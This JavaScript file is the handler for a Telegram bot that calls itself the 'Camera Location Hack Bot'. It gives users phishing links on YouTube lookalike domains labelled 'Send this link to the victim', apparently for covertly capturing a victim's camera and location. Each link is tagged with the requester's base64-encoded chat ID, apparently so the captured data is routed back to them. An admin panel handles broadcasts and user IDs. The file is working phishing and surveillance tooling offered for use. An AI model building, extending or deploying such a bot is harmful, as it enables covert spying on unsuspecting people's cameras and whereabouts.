const { getUsers, saveUser, deleteUser, addUser } = require('./storage');

const ADMIN_ID = process.env.ADMIN_ID;

const linkData = [
  {
    name: "📷 Camera Hack 📷",
    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://youthube-videoshort.vercel.app/" }]
  },
  {
    name: "🌍 Location Hack 🌍",
    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
  },
  {
    name: "🌍 video hack 🌍",
    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/video/" }]
  }
];

// In-memory state (per cold-start, use KV store for persistent state)
const broadcastStates = new Map();
const deleteChatIdState = new Map();
const addChatIdState = new Map();

function encodeBase64(text) {
  return Buffer.from(text.toString()).toString('base64');
}

function generateMainMenu() {
  return linkData.map(item => ([{ text: item.name, callback_data: `menu_${item.name}` }]));
}

async function handleUpdate(bot, update) {
  if (update.message) {
    await handleMessage(bot, update.message);
  } else if (update.callback_query) {
    await handleCallbackQuery(bot, update.callback_query);
  }
}

async function handleMessage(bot, msg) {
  const chatId = msg.chat.id;
  const text = msg.text || '';

  // /start command
  if (text === '/start') {
    await saveUser(chatId);
    await bot.sendAnimation(chatId, "https://media4.giphy.com/media/hv13U4h8Y7hEdCQ0Ik/giphy.gif?cid=6c09b952lq8xqrlt92pxse7h50b1sy03t0l7po8bt25fkts4&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g", {
      caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: generateMainMenu() }
    });
    return;
  }

  // /admin command
  if (text === '/admin' && chatId.toString() === ADMIN_ID) {
    const users = await getUsers();
    await bot.sendMessage(chatId, `🔐 *Admin Panel*\nTotal Users: ${users.length}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📊 Total Users", callback_data: "admin_users" }],
          [{ text: "📢 Broadcast Message", callback_data: "admin_broadcast" }],
          [{ text: "📥 Download Chat IDs", callback_data: "admin_download_chat_ids" }],
          [{ text: "❌ Delete Chat ID", callback_data: "admin_delete_chat_id" }],
          [{ text: "➕ Add Chat ID", callback_data: "admin_add_chat_id" }]
        ]
      }
    });
    return;
  }

  // Admin broadcast state
  if (chatId.toString() === ADMIN_ID && broadcastStates.get(chatId)) {
    broadcastStates.delete(chatId);
    const users = await getUsers();
    let successCount = 0, failCount = 0;

    for (const userId of users) {
      try {
        if (msg.text) {
          await bot.sendMessage(userId, msg.text);
        } else if (msg.video) {
          await bot.sendVideo(userId, msg.video.file_id, { caption: msg.caption });
        } else if (msg.photo) {
          await bot.sendPhoto(userId, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption });
        }
        successCount++;
      } catch (err) {
        failCount++;
      }
    }

    await bot.sendMessage(chatId, `📢 *Broadcast completed!*\nSuccess: ${successCount}\nFailed: ${failCount}`, {
      parse_mode: "Markdown"
    });
    return;
  }

  // Admin delete chat ID state
  if (chatId.toString() === ADMIN_ID && deleteChatIdState.get(chatId)) {
    deleteChatIdState.delete(chatId);
    const success = await deleteUser(msg.text);
    await bot.sendMessage(chatId, success
      ? `✅ Chat ID ${msg.text} deleted successfully.`
      : `❌ Failed to delete Chat ID ${msg.text}.`
    );
    return;
  }

  // Admin add chat ID state
  if (chatId.toString() === ADMIN_ID && addChatIdState.get(chatId)) {
    addChatIdState.delete(chatId);
    const success = await addUser(msg.text);
    await bot.sendMessage(chatId, success
      ? `✅ Chat ID ${msg.text} added successfully.`
      : `❌ Chat ID ${msg.text} already exists or failed to add.`
    );
    return;
  }
}

async function handleCallbackQuery(bot, callbackQuery) {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  // User menu
  if (data.startsWith('menu_')) {
    const buttonName = data.replace('menu_', '');
    const buttonData = linkData.find(b => b.name === buttonName);
    if (!buttonData) return bot.sendMessage(chatId, "Button not found.");

    const encodedChatId = encodeBase64(chatId);
    let message = `🔗 *Links for ${buttonName}:*\n\n`;
    buttonData.links.forEach(link => {
      const modifiedLink = `${link.value}?i=${encodedChatId}`;
      message += `🔹 ${link.text}: ${modifiedLink}\n\n`;
    });

    await bot.sendMessage(chatId, message, {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] }
    });
    return;
  }

  if (data === 'back_to_main') {
    await bot.sendAnimation(chatId, "https://media.giphy.com/media/3o7abAHdYvZdBNnGZq/giphy.gif", {
      caption: "*🎉 Welcome to the Camera Location Hack Bot!* \n\nChoose an option below:",
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: generateMainMenu() }
    });
    return;
  }

  // Admin callbacks
  if (chatId.toString() !== ADMIN_ID) return;

  if (data === 'admin_users') {
    const users = await getUsers();
    await bot.sendMessage(chatId, `📊 *Total Users:* ${users.length}\n\n*User IDs:*\n${users.join('\n')}`, {
      parse_mode: "Markdown"
    });
  } else if (data === 'admin_broadcast') {
    broadcastStates.set(chatId, true);
    await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image, or video):');
  } else if (data === 'admin_download_chat_ids') {
    const users = await getUsers();
    await bot.sendMessage(chatId, `📋 *All Chat IDs:*\n${users.join('\n')}`, { parse_mode: "Markdown" });
  } else if (data === 'admin_delete_chat_id') {
    deleteChatIdState.set(chatId, true);
    await bot.sendMessage(chatId, '❌ Enter the Chat ID you want to delete:');
  } else if (data === 'admin_add_chat_id') {
    addChatIdState.set(chatId, true);
    await bot.sendMessage(chatId, '➕ Enter the new Chat ID you want to add:');
  }
}

module.exports = { handleUpdate };
